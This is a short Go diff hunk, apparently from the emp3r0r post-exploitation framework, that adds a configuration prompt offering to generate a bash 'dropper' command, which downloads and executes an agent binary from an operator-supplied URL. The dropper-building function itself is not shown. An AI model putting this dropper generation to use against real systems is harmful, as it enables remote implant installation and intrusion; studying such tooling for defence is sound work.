@@ -266,6 +266,13 @@ func PromptForConfig(isAgent bool) (err error) {
 		RuntimeConfig.BroadcastIntervalMax = 120
 	}
 
+	// ask for URL to download/exec agent
+	if CliYesNo("Generate bash dropper command?") {
+		url := CliAsk("(HTTP) URL to download agent binary (or staged executables), eg. 'http://example.com/emp3r0r': ")
+		dropper := bash_http_downloader(url)
+		CliPrintInfo("Your dropper command is\n%s", dropper)
+	}
+
 	// save emp3r0r.json
 	return save_config_json()
 }
